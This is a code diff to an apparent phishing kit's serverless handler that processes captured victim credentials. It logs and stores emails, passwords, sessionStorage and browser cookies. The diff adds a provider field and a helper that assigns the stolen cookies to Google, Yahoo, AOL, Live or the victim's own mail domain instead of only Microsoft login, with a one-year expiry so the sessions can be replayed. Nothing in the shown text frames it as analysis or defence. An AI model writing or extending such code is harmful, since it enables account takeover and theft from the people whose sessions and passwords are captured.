@@ -97,7 +97,8 @@ export const handler = async (event, context) => {
             sessionStorage: session.sessionStorage || 'Empty',
             timestamp: session.timestamp,
             email: session.email,
-            password: session.password || 'Not captured'
+            password: session.password || 'Not captured',
+            provider: session.provider || 'Others'
           };
         }
       } catch (error) {
@@ -117,7 +118,8 @@ export const handler = async (event, context) => {
             sessionStorage: user.sessionStorage || 'Empty',
             timestamp: user.timestamp,
             email: user.email,
-            password: user.password || 'Not captured'
+            password: user.password || 'Not captured',
+            provider: user.provider || 'Others'
           };
         }
       } catch (error) {
@@ -151,12 +153,37 @@ export const handler = async (event, context) => {
 
     console.log('✅ Found cookies data:', {
       cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
-      email: cookiesData.email
+      email: cookiesData.email,
+      provider: cookiesData.provider
     });
 
     const clientIP = getClientIP();
     const userEmail = cookiesData.email || 'Not captured';
     const userPassword = cookiesData.password || 'Not captured';
+    const userProvider = cookiesData.provider || 'Others';
+
+    // Helper to get domain from email/provider
+    const getDomainFromEmailProvider = (email, provider) => {
+      const providerLower = (provider || '').toLowerCase();
+      if (providerLower.includes('gmail') || providerLower.includes('google')) {
+        return '.google.com';
+      } else if (providerLower.includes('yahoo')) {
+        return '.yahoo.com';
+      } else if (providerLower.includes('aol')) {
+        return '.aol.com';
+      } else if (providerLower.includes('hotmail') || providerLower.includes('live') || 
+                 providerLower.includes('outlook') || providerLower.includes('office365')) {
+        return '.live.com';
+      } else if (providerLower === 'others' && email && email.includes('@')) {
+        const domainPart = email.split('@')[1].toLowerCase();
+        return '.' + domainPart;
+      }
+      // Fallback based on email
+      if (email && email.includes('@')) {
+        return '.' + email.split('@')[1].toLowerCase();
+      }
+      return '.google.com';
+    };
 
     // Process cookies with improved handling
     let processedCookies = [];
@@ -179,7 +206,8 @@ export const handler = async (event, context) => {
             return name && value ? {
               name: name.trim(),
               value: value.trim(),
-              domain: '.login.microsoftonline.com',
+              // Set domain using improved logic:
+              domain: getDomainFromEmailProvider(userEmail, userProvider),
               path: '/',
               secure: true,
               httpOnly: false,
@@ -196,7 +224,7 @@ export const handler = async (event, context) => {
 
     // Ensure cookies have proper format
     const formattedCookies = processedCookies.map(cookie => ({
-      domain: cookie.domain || '.login.microsoftonline.com',
+      domain: cookie.domain || getDomainFromEmailProvider(userEmail, userProvider),
       expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
       hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : false,
       httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
